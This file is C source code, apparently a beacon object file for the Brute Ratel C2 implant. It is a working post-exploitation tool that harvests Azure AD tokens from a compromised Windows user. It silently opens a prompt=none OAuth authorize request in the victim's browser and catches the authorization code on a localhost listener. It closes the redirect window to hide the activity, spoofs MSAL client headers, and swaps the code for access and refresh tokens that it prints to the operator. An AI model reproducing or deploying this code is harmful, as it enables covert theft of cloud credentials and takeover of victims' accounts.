#include "definitions.h"
#include "badger_exports.h"

#ifndef RtlGenRandom
#define RtlGenRandom ADVAPI32$SystemFunction036
#endif

char fmtString[] = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=http://localhost:%d&prompt=none%s%s&response_mode=query&scope=%s&state=12345&code_challenge=%s&code_challenge_method=S256";
const char allowed_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";

typedef struct _ctx {
    HANDLE listening;  // event set when we start listening and port has been set.
    unsigned char PKCE[129];
    unsigned char hashedPKCE[32];
    char base64PKCE[46];  // 45 for null term
    char state[50];
    char tokens[16184];
    char *authcode;
    char *error;
    char *error_desc;
    DWORD tokensLen;
    unsigned short timeout;
    unsigned short port;
} ctx;

typedef enum _browser { EDGE, CHROME, DEFAULT, OTHER } browserType;

typedef struct _flow_args {
    const char *client_id;
    const char *scope;
    const char *hint;
    browserType browser;
    const char *browser_path;  // only used when browser is OTHER

} flow_args;

#pragma region utils
void GeneratePKCE(char *PKCE) {
    if (PKCE == NULL) return;
    unsigned char randomdata[129];
    RtlGenRandom(randomdata, 129);
    int length = (randomdata[0] % 85) + 43;  // length is random string between 43-128
    for (int i = 1; i <= length; i++) {
        PKCE[i - 1] = allowed_chars[randomdata[i] % (sizeof(allowed_chars) - 1)];
    }
}

// We're just going to check status in calling func for this
void ConvertToChallenge(ctx *context) {
    BCRYPT_ALG_HANDLE alg;
    BCRYPT_HASH_HANDLE hHash;
    BCRYPT$BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCRYPT$BCryptCreateHash(alg, &hHash, NULL, 0, NULL, 0, 0);
    DWORD length = (DWORD)MSVCRT$strnlen((char*)context->PKCE, 128);
    BCRYPT$BCryptHashData(hHash, context->PKCE, length, 0);
    BCRYPT$BCryptFinishHash(hHash, context->hashedPKCE, 32, 0);
    BCRYPT$BCryptDestroyHash(hHash);
    BCRYPT$BCryptCloseAlgorithmProvider(alg, 0);
    CRYPT32$CryptBinaryToStringA(context->hashedPKCE, 32, CRYPT_STRING_BASE64URI | CRYPT_STRING_NOCRLF, context->base64PKCE, &length);
}
#pragma endregion

#pragma region server
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    char WindowName[128] = {0};
    const char *host = (const char *)lParam;
    DWORD WinLen = (DWORD)USER32$GetWindowTextA(hwnd, WindowName, 127);

    if (WindowName[0] != 0 && WinLen) {
        if (MSVCRT$strstr(WindowName, host) != NULL || MSVCRT$strstr(WindowName, "Redirecting") != NULL) {
            DWORD_PTR result = 0;
            USER32$SendMessageTimeoutW(hwnd, WM_CLOSE, 0, 0, SMTO_ABORTIFHUNG, 500, &result);
            return 0;
        }
    }
    return 1;
}

static void SendMsg(SOCKET s) {
    char msg[] = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><script>window.onload = function() {window.close();};</script></body></html>";
    WS2_32$send(s, msg, sizeof(msg) - 1, 0);
    WS2_32$closesocket(s);
}

DWORD GetCode(SOCKET s, ctx *context) {
    char *buffer = BadgerAlloc(16184);
    // this likely needs to be more robust, but starting here... famous last words
    WS2_32$recv(s, buffer, 16183, 0);
    SendMsg(s);
    // figure out where the newline is, that should be our GET line w/ params
    // buffer[sizeof(buffer) - 1] = 0; //null off so strchr usage is safe
    // BeaconPrintf(CALLBACK_OUTPUT, "got back buffer of %s\n", buffer);
    char *end = MSVCRT$strchr(buffer, '\n');
    if (end == NULL) {
        BadgerFree((PVOID *)&buffer);
        return FALSE;
    }
    char *start = buffer;
    // char * authcode[]
    while (*start != '?' && start != end) {
        start++;
    }
    if (start == end) {
        BadgerFree((PVOID *)&buffer);
        return FALSE;  //
    }
    start++;  // start now points at first param
    while (*end != ' ') {
        end--;
    }
    // end now points at space between path and HTTP
    *end = 0;
    while (start < end) {
        if (MSVCRT$strncmp(start, "code=", 5) == 0) {
            start += 5;
            char *strend = start;
            while (*strend != '&' && strend != end) {
                strend++;
            }
            DWORD size = (DWORD)(strend - start);
            context->authcode = BadgerAlloc(size + 1);
            BadgerMemcpy(context->authcode, start, size);
            break;
        } else if (MSVCRT$strncmp(start, "error=", 6) == 0) {
            start += 6;
            char *strend = start;
            while (*strend != '&' && strend != end) {
                strend++;
            }
            DWORD size = (DWORD)(strend - start);
            context->error = BadgerAlloc(size + 1);
            BadgerMemcpy(context->error, start, size);
        } else if (MSVCRT$strncmp(start, "error_description=", 18) == 0) {
            start += 18;
            char *strend = start;
            while (*strend != '&' && strend != end) {
                strend++;
            }
            DWORD size = (DWORD)(strend - start);
            context->error_desc = BadgerAlloc(size + 1);
            BadgerMemcpy(context->error_desc, start, size);
        }
        // something else was there got to & or end
        for (; *start != '&' && start <= end; start++);  // intentional ; at end
        start++;                                         // if we were at & this jumps us over, if we were at end this doesn't matter we still exit
    }
    char host[64] = {0};
    MSVCRT$_snprintf(host, 63, "localhost:%d", context->port);
    // check that our window actually closed, otherwise send it a close msg
    USER32$EnumDesktopWindows(NULL, (WNDENUMPROC)EnumWindowsProc, (LPARAM)host);
    BadgerFree((PVOID *)&buffer);
    return 0;
}

// Normally you would never use a thread in a bof, but we're going to kill this thread / clean up before exiting
DWORD WINAPI ListenServer(void *_ctx) {
    ctx *context = (ctx *)_ctx;
    int bindval = SOCKET_ERROR;
    struct sockaddr_in localaddr = {0};
    SOCKET s = 0;
    int tries = 0;
    while (bindval == SOCKET_ERROR)  // Code this as a loop so if our port happens to be taken we retry;
    {
        tries++;
        if (tries > 100) {
            BadgerDispatch(g_dispatch, "[-] This shouldn't be hit but we can't bind a socket so bailing\n");
            return 0;
        }
        s = (SOCKET)WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        RtlGenRandom(&(context->port), 2);
        context->port = (context->port % 30000) + (u_short)30000;
        localaddr.sin_port = WS2_32$htons(context->port);
        localaddr.sin_family = AF_INET;
        localaddr.sin_addr.s_addr = WSOCK32$inet_addr("127.0.0.1");
        bindval = WS2_32$bind(s, (struct sockaddr *)&localaddr, sizeof(struct sockaddr_in));
        if (bindval == SOCKET_ERROR) {
            WS2_32$closesocket(s);
            continue;
        }
        if (WS2_32$listen(s, 1) == SOCKET_ERROR) {
            bindval = SOCKET_ERROR;
            WS2_32$closesocket(s);
            continue;
        }
    }
    KERNEL32$SetEvent(context->listening);  // notify client we're ready to rock and port is populated
    // We're only going to accept the first connection and process it, breaking into a func for potential future reuse
    SOCKET client = WS2_32$accept(s, NULL, NULL);  // its us connecting so we don't need that info
    GetCode(client, context);                      // GetCode closes the clietn socket
    WS2_32$closesocket(s);
    return 0;
}

#pragma endregion

#pragma region client

int RequestToken(flow_args *args, ctx *context) {
    int ret = 1;
    DWORD length = 0;
    char redir_uri[64] = {0};
    char *postData = NULL;
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    postData = BadgerAlloc(4096);
    if (!postData) {
        BadgerDispatch(g_dispatch, "[-] Memory allocation failed for postData\n");
        goto cleanup;
    }

    if (MSVCRT$_snprintf(redir_uri, sizeof(redir_uri), "http%%3A%%2F%%2Flocalhost%%3A%d", context->port) < 0) {
        BadgerDispatch(g_dispatch, "[-] Failed to format redirect URI\n");
        goto cleanup;
    }

    // client_id, scope, code, redir_uri, plaintext PKCE
    const char *postFmt = "client_id=%s&scope=%s&code=%s&redirect_uri=%s&grant_type=authorization_code&code_verifier=%s";
    length = (DWORD)MSVCRT$_snprintf(postData, 4096, postFmt, args->client_id, "https%3A%2F%2Fmanagement.core.windows.net%2F%2F.default+offline_access+openid+profile", context->authcode, redir_uri, context->PKCE);

    if (length <= 0 || length >= 4096) {
        BadgerDispatch(g_dispatch, "[-] Failed to format POST data or buffer overflow\n");
        goto cleanup;
    }

    // Might want to check that user agent
    hSession = WINHTTP$WinHttpOpen(L"azsdk-net-Identity.Broker/1.1.0 (.NET 9.0.1; ur dad edition)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        BadgerDispatch(g_dispatch, "[-] WinHttpOpen failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    hConnect = WINHTTP$WinHttpConnect(hSession, L"login.microsoftonline.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        BadgerDispatch(g_dispatch, "[-] WinHttpConnect failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"POST", L"/common/oauth2/v2.0/token", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        BadgerDispatch(g_dispatch, "[-] WinHttpOpenRequest failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    BOOL headersAdded = WINHTTP$WinHttpAddRequestHeaders(hRequest,
                                                         L"x-client-SKU: MSAL.CoreCLR\r\n"
                                                         L"x-client-Ver: 7.65.0.0\r\n"
                                                         L"x-client-OS: Windows\r\n"
                                                         L"x-anchormailbox: oid:6d0098a1-0d29-43b0-0000-c267d70b3f21@4508ba81-0000-0056-9100-976e004aed1e\r\n"
                                                         L"x-client-current-telemetry: 2|1005,0,,,|1,1,1,,\r\n"
                                                         L"x-ms-lib-capability: retry-after, h429\r\n"
                                                         L"client-request-id: 78000e7f-4e21-4054-bb00-9625900216c2\r\n"
                                                         L"return-client-request-id: true\r\n"
                                                         L"x-ms-client-request-id: 78000e7f-4e21-4054-bb00-9625900216c2\r\n"
                                                         L"x-ms-return-client-request-id: true\r\n"
                                                         L"Content-Type: application/x-www-form-urlencoded",
                                                         0xFFFFFFFF, WINHTTP_ADDREQ_FLAG_ADD);

    if (!headersAdded) {
        BadgerDispatch(g_dispatch, "[-] WinHttpAddRequestHeaders failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    if (!WINHTTP$WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, postData, length, length, 0)) {
        BadgerDispatch(g_dispatch, "[-] WinHttpSendRequest failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    if (!WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
        BadgerDispatch(g_dispatch, "[-] WinHttpReceiveResponse failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    if (!WINHTTP$WinHttpReadData(hRequest, context->tokens, 16184, &context->tokensLen)) {
        BadgerDispatch(g_dispatch, "[-] WinHttpReadData failed with error %lu\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    BadgerDispatch(g_dispatch, "[+] Token response read: %lu bytes\n", context->tokensLen);
    ret = 0;

cleanup:
    if (postData) BadgerFree((PVOID *)&postData);
    if (hRequest) WINHTTP$WinHttpCloseHandle(hRequest);
    if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
    if (hSession) WINHTTP$WinHttpCloseHandle(hSession);

    return ret;
}

void StartAuthCodeFlow(flow_args *args, ctx *context) {
    // Generate PKCE
    char auth_uri[512] = {0};
    char browser_path[MAX_PATH] = {0};
    if (context == NULL) {
        return;
    }
    GeneratePKCE((char*)context->PKCE);
    if (context->PKCE[0] == '\0') {
        BadgerDispatch(g_dispatch, "[-] Failed to generate PKCE code\n");
        return;
    }
    ConvertToChallenge(context);
    if (context->base64PKCE[0] == '\0') {
        BadgerDispatch(g_dispatch, "[-] Failed to generate base64 of hashed PKCE code\n");
        return;
    }
    HANDLE hThread = (HANDLE)MSVCRT$_beginthreadex(NULL, 0, (_beginthreadex_proc_type)ListenServer, (void *)context, 0, NULL);
    if (KERNEL32$WaitForSingleObject(context->listening, 30000) == WAIT_OBJECT_0) {
        BOOL hasHint = args->hint != NULL;
        MSVCRT$_snprintf(auth_uri, sizeof(auth_uri), fmtString, args->client_id, context->port, (hasHint) ? "&login_hint=" : "", (hasHint) ? args->hint : "", args->scope, context->base64PKCE);

        switch (args->browser) {
            case DEFAULT:
                SHELL32$ShellExecuteA(NULL, "open", auth_uri, NULL, NULL, SW_SHOWNORMAL);
                break;
            case EDGE:
                MSVCRT$strcpy(browser_path, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
            // Intentional fall through
            case CHROME:
                if (*browser_path == '\0') {
                    MSVCRT$strcpy(browser_path, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
                }
            // Intentional fall through
            case OTHER: {
                if (*browser_path == '\0') {
                    MSVCRT$strcpy(browser_path, args->browser_path);
                }
                char *arguments = BadgerAlloc(4096);
                MSVCRT$strcat(arguments, "--app=\"");
                MSVCRT$strcat(arguments, auth_uri);
                MSVCRT$strcat(arguments, "\"");
                BadgerDispatch(g_dispatch, "[*] Executing %s %s\n", browser_path, arguments);
                SHELL32$ShellExecuteA(NULL, "open", browser_path, arguments, NULL, SW_SHOWNORMAL);
                BadgerFree((PVOID *)&arguments);
                break;
            }
            default: {
                BadgerDispatch(g_dispatch, "[-] Invalid value given for browser\n");
                break;  // We shouldn't get here but we'll handle it regardless
            }
        }
    } else {
        BadgerDispatch(g_dispatch, "[-] Listen event failed to trigger");
    }
    if (KERNEL32$WaitForSingleObject(hThread, 10000) == WAIT_OBJECT_0) {
        if (context->authcode) {
            BadgerDispatch(g_dispatch, "[+] Got authcode now requesting tokens\n");
            RequestToken(args, context);

        } else {
            BadgerDispatch(g_dispatch, "[-] Failed to receive auth code, unable to proceed");
        }
    } else {
        BadgerDispatch(g_dispatch, "[*] Local server did not stop, force killing it and bailing\n");
        KERNEL32$TerminateThread(hThread, 1);
    }
    KERNEL32$CloseHandle(hThread);
}

#pragma endregion

void printHelp(){
    BadgerDispatch(g_dispatch, "[*] Usage: get_azure_token.o <client_id> <scope> <browser_id> <hint> <browser_path>\n");
    BadgerDispatch(g_dispatch, "[*] <client_id>       Set the client id\n");
    BadgerDispatch(g_dispatch, "[*] <scope>           Set the scope\n");
    BadgerDispatch(g_dispatch, "[*] <browser_id>      Available Browser IDs:\n");
    BadgerDispatch(g_dispatch, "                      0 - Edge\n");
    BadgerDispatch(g_dispatch, "                      1 - Chrome\n");
    BadgerDispatch(g_dispatch, "                      2 - Users Default Browser\n");
    BadgerDispatch(g_dispatch, "                      3 - Other (Specify with <browser_path> arg)\n");
    BadgerDispatch(g_dispatch, "[*] <hint>            (Optional - Set to 0 if not needed.)\n");
    BadgerDispatch(g_dispatch, "[*] <browser_path>    (Optional - Set to 0 if not needed.)\n");
}

void coffee(char **argv, int argc, WCHAR **dispatch) {
    g_dispatch = dispatch;

    // Help check
	for (int i = 0; i < argc; i++) {
		if(BadgerStrcmp(argv[i], "-h") == 0){
			printHelp();
			return;
		}
	}

    if (argc < 5) {
        printHelp();
        return;
    }

    flow_args *args = BadgerAlloc(sizeof(flow_args));
    if (!args) {
        BadgerDispatch(g_dispatch, "[-] Failed to allocate memory for flow_args\n");
        return;
    }

    ctx *context = BadgerAlloc(sizeof(ctx));
    if (!context) {
        BadgerDispatch(g_dispatch, "[-] Failed to allocate memory for ctx\n");
        goto cleanup;
    }

    context->listening = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!context->listening) {
        BadgerDispatch(g_dispatch, "[-] Failed to create event\n");
        goto cleanup;
    }

    args->client_id = argv[0];
    args->scope = argv[1];
    args->browser = (browserType)BadgerAtoi(argv[2]);

    args->hint = (BadgerStrcmp(argv[3], "0") == 0) ? NULL : argv[3];
    args->browser_path = (BadgerStrcmp(argv[4], "0") == 0) ? NULL : argv[4];

    size_t bplen = args->browser_path ? BadgerStrlen((char*)args->browser_path) : 0;

    if (bplen > MAX_PATH) {
        BadgerDispatch(g_dispatch, "[-] Provided browser path is too long, must be <= %d\n", MAX_PATH);
        goto cleanup;
    }

    if (args->browser == OTHER && args->browser_path == NULL) {
        BadgerDispatch(g_dispatch, "[-] Browser type 'OTHER' (3) requires a browser path\n");
        goto cleanup;
    }

    if (args->browser > OTHER || args->browser < 0) {
        BadgerDispatch(g_dispatch, "[-] Invalid browser ID\n");
        goto cleanup;
    }

    WSADATA wsdata = {0};
    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsdata) != 0) {
        BadgerDispatch(g_dispatch, "[-] WSAStartup failed\n");
        goto cleanup;
    }

    StartAuthCodeFlow(args, context);

    if (context->tokens[0]) {
        BadgerDispatch(g_dispatch, "\n---\n%s\n---\n", context->tokens);
    } else if (context->error) {
        BadgerDispatch(g_dispatch, "[-] Fail: %s (%s)\n", context->error, context->error_desc ? context->error_desc : "No description available");
    }

    WS2_32$WSACleanup();

    BadgerDispatch(g_dispatch, "[+] Done");

cleanup:
    BadgerFree((PVOID *)&args);
    if (context->listening) KERNEL32$CloseHandle(context->listening);
    if (context->error) BadgerFree((PVOID *)&context->error);
    if (context->error_desc) BadgerFree((PVOID *)&context->error_desc);
    if (context->authcode) BadgerFree((PVOID *)&context->authcode);
    BadgerFree((PVOID *)&context);
}
